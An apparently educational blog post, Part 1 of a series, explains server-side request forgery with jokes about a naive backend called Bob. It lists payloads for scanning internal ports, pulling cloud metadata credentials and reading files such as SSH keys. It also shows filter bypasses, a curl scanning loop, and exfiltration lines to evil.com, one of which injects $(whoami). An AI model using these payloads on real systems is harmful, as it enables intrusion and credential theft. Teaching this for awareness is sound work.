---
title: "SSRF: When Your Server Becomes a Nosy Hacker — Part 1"
description: "SSRF: When Your Server Becomes a Nosy Hacker — Part 1"
date: 2025-06-03
tags: ["ssrf", "web-security"]
readTime: "8 min read"
---

## **SSRF: When Your Server Becomes a Nosy Hacker — Part 1** 🔍

![](/images/blog/ssrf-server-side-request-forgery/0_YgnhrfUqF8q6gYnE.png)

_This write-up has been prepared under the guidance of_ [_Amish Patel_](https://medium.com/@cyberexpertamish)_,_ [_Lay Patel_](https://medium.com/@cynex) _at_ [_Hacker4Help_](https://medium.com/@hacker4help) _as part of our learning initiative on cybersecurity awareness._

* * *

> When your backend gets too curious and ends up being the hacker’s sidekick 😂

* * *

Let’s imagine your server is like your slightly naive friend Bob.

![](/images/blog/ssrf-server-side-request-forgery/0_XkKiBjkzaZsPva7W.gif)

Now, Bob’s job is to fetch stuff for you — pictures, JSON data, maybe even a cat video if you ask nicely.

But what if an attacker walks up and says:

_“Hey Bob, can you go to this URL for me? Totally normal. Not sketchy at all. Definitely not_ `_http://localhost:1337/admin_`_."_

And Bob, bless his trusting soul, says: **“Sure, buddy! Anything for a user!”** 🫡

![](/images/blog/ssrf-server-side-request-forgery/0_ZHbBOdzaO_H1WzTq.gif)

* * *

## What Is SSRF, Really?

**Server-Side Request Forgery (SSRF)** is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker’s choosing.

## Technical Definition:

SSRF occurs when a web application accepts a user-supplied URL and retrieves the contents of this URL, but does not validate it against an allowlist of permitted domains or IP addresses.

## The Attack Vector:

The attacker leverages the server’s network position and privileges to:

-   Access internal services not exposed to the internet
-   Bypass firewall restrictions
-   Perform port scanning on internal networks
-   Access cloud metadata services
-   Potentially escalate to Remote Code Execution (RCE)

* * *

## Funny Analogy: Bob the Backend and the Forbidden Fridge 🤡

**Bob**: “I’m just a backend doing my job.”

**Attacker**: “Go open that fridge labeled ‘For Employees Only.’”

**Bob**: _Opens it without question_

**Fridge**: _Alarms blaring, database leaking, credentials falling like Jenga blocks_

![](/images/blog/ssrf-server-side-request-forgery/0_fnEK9XbwwuUiOFFN.gif)

* * *

## Real Exploit Flow 🔥

### 1\. Vulnerable Endpoint Discovery

```
// Vulnerable PHP code example<?phpif (isset($_GET['url'])) {    $url = $_GET['url'];    $content = file_get_contents($url);  // VULNERABLE!    echo $content;}?>
```
```
# Vulnerable Python Flask example@app.route('/fetch')def fetch_url():    url = request.args.get('url')    response = requests.get(url)  # VULNERABLE!    return response.text
```

### 2\. Attack Vectors and Payloads

A. Internal Network Reconnaissance

```
# Port scanning internal networkhttp://target.com/fetch?url=http://127.0.0.1:22http://target.com/fetch?url=http://127.0.0.1:80http://target.com/fetch?url=http://127.0.0.1:443http://target.com/fetch?url=http://127.0.0.1:3306  # MySQLhttp://target.com/fetch?url=http://127.0.0.1:5432  # PostgreSQLhttp://target.com/fetch?url=http://127.0.0.1:6379  # Redishttp://target.com/fetch?url=http://127.0.0.1:27017 # MongoDB
```

B. Cloud Metadata Exploitation

```
# AWS EC2 Metadatahttp://target.com/fetch?url=http://169.254.169.254/latest/meta-data/http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/http://target.com/fetch?url=http://169.254.169.254/latest/user-data/# Google Cloud Metadatahttp://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/http://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token# Azure Metadatahttp://target.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2017-08-01
```

**C. File System Access (if supported)**

```
# Local file inclusion via file:// protocolhttp://target.com/fetch?url=file:///etc/passwdhttp://target.com/fetch?url=file:///etc/hostshttp://target.com/fetch?url=file:///proc/self/environhttp://target.com/fetch?url=file:///var/log/apache2/access.log
```

**D. Internal Application Access**

```
# Admin panelshttp://target.com/fetch?url=http://localhost/adminhttp://target.com/fetch?url=http://127.0.0.1:8080/manager/html# Internal APIshttp://target.com/fetch?url=http://internal-api.company.local/usershttp://target.com/fetch?url=http://192.168.1.100/api/config
```

* * *

## Basic SSRF Exploitation Techniques 🛠️

### 1\. Simple IP Address Bypasses

A. Alternative IP Representations

```
# Decimal notation (127.0.0.1 = 2130706433)http://target.com/fetch?url=http://2130706433/# Octal notationhttp://target.com/fetch?url=http://0177.0.0.1/# Hexadecimal notationhttp://target.com/fetch?url=http://0x7f000001/# Mixed representationshttp://target.com/fetch?url=http://127.1/http://target.com/fetch?url=http://127.0.1/http://target.com/fetch?url=http://0x7f.1/
```

B. DNS Rebinding Attacks

```
# Using services like nip.iohttp://target.com/fetch?url=http://127.0.0.1.nip.io/http://target.com/fetch?url=http://localhost.127.0.0.1.nip.io/# Custom DNS records pointing to internal IPshttp://target.com/fetch?url=http://internal.evil.com/  # Resolves to 127.0.0.1
```

### **2\. URL Encoding and Obfuscation**

```
# Single URL encodinghttp://target.com/fetch?url=http%3A%2F%2F127.0.0.1%2F# Double URL encodinghttp://target.com/fetch?url=http%253A%252F%252F127.0.0.1%252F# Unicode encodinghttp://target.com/fetch?url=http://①②⑦.⓪.⓪.①/# Using redirects to bypass filtershttp://target.com/fetch?url=http://evil.com/redirect.php?to=127.0.0.1
```

### **3\. Protocol Exploitation**

A. HTTP/HTTPS Variations

```
# Standard HTTPhttp://target.com/fetch?url=http://127.0.0.1/# HTTPS (if SSL/TLS not validated)http://target.com/fetch?url=https://127.0.0.1/# Non-standard portshttp://target.com/fetch?url=http://127.0.0.1:8080/http://target.com/fetch?url=http://127.0.0.1:9000/
```

B. File Protocol

```
# Linux/Unix systemshttp://target.com/fetch?url=file:///etc/passwdhttp://target.com/fetch?url=file:///proc/versionhttp://target.com/fetch?url=file:///home/user/.ssh/id_rsa# Windows systemshttp://target.com/fetch?url=file:///c:/windows/system.inihttp://target.com/fetch?url=file:///c:/boot.ini
```

* * *

## 🎯 High-Impact SSRF Attack Scenarios

### **1\. AWS EC2 Instance Metadata Exploitation**

```
# Step 1: Check if metadata service is accessiblehttp://target.com/fetch?url=http://169.254.169.254/# Step 2: Get instance metadatahttp://target.com/fetch?url=http://169.254.169.254/latest/meta-data/# Step 3: Enumerate IAM roleshttp://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/# Step 4: Get IAM role name (example: WebServerRole)http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/WebServerRole# Step 5: Extract AWS credentials from response{  "Code" : "Success",  "LastUpdated" : "2024-01-15T10:30:00Z",  "Type" : "AWS-HMAC",  "AccessKeyId" : "ASIA...",  "SecretAccessKey" : "...",  "Token" : "...",  "Expiration" : "2024-01-15T16:30:00Z"}
```

### **2\. Internal Service Discovery**

```
# Common internal service portsPORTS=(22 23 25 53 80 110 143 443 993 995 1433 3306 3389 5432 5984 6379 8080 8443 9200 27017)# Automated scanning script conceptfor PORT in "${PORTS[@]}"; do    echo "Testing port $PORT..."    curl "http://target.com/fetch?url=http://127.0.0.1:$PORT"    curl "http://target.com/fetch?url=http://localhost:$PORT"    curl "http://target.com/fetch?url=http://0.0.0.0:$PORT"done
```

### **3\. Database Access Through SSRF**

```
# MySQL (default port 3306)http://target.com/fetch?url=http://127.0.0.1:3306/# PostgreSQL (default port 5432)http://target.com/fetch?url=http://127.0.0.1:5432/# MongoDB (default port 27017)http://target.com/fetch?url=http://127.0.0.1:27017/# Redis (default port 6379)http://target.com/fetch?url=http://127.0.0.1:6379/# CouchDB (default port 5984)http://target.com/fetch?url=http://127.0.0.1:5984/_all_dbs
```

* * *

## Blind SSRF Detection 🎪

### 1\. DNS-Based Detection

```
# Using Burp Collaboratorhttp://target.com/fetch?url=http://abc123.burpcollaborator.net/# Using custom DNS serverhttp://target.com/fetch?url=http://ssrf-test.evil.com/# DNS exfiltrationhttp://target.com/fetch?url=http://$(whoami).evil.com/
```

### **2\. HTTP-Based Detection**

```
# Using HTTP callbackshttp://target.com/fetch?url=http://requestbin.net/r/abc123# Using webhook.sitehttp://target.com/fetch?url=https://webhook.site/unique-id# Time-based detectionhttp://target.com/fetch?url=http://httpbin.org/delay/10
```

### **3\. Error-Based Detection**

```
# Connection timeout (closed port)http://target.com/fetch?url=http://127.0.0.1:12345/# Connection refusedhttp://target.com/fetch?url=http://192.168.1.1:22/# DNS resolution failurehttp://target.com/fetch?url=http://nonexistent-domain-12345.com/
```

* * *

## Real-World Impact Examples 📊

### 1\. Capital One Data Breach (2019)

-   **Attack Vector**: SSRF against AWS EC2 metadata service
-   **Impact**: 100+ million customer records compromised
-   **Technique**: Exploited web application firewall to access EC2 metadata
-   **Lesson**: Always restrict access to cloud metadata services

### 2\. Shopify SSRF (2017)

-   **Bounty Paid**: $25,000
-   **Attack Vector**: Internal GraphQL endpoint access
-   **Impact**: Internal service enumeration and sensitive data access
-   **Technique**: Bypassed IP restrictions using DNS rebinding

### 3\. Uber SSRF (2016)

-   **Bounty Paid**: $8,000
-   **Attack Vector**: Internal admin panel access
-   **Impact**: Access to internal Uber services
-   **Technique**: Simple localhost bypass using 127.0.0.1

* * *

## 🎬 Part 1 Conclusion: Bob’s First Lesson

![](/images/blog/ssrf-server-side-request-forgery/0_-hG19yLhOTRUyHI5.gif)

**Bob**: “Wait, so you’re telling me I’ve been helping attackers this whole time?”

**Security Team**: “Unfortunately, yes. But don’t worry, we’re going to teach you some advanced tricks to spot these attacks!”

**Attacker**: “Uh oh, they’re getting smarter…”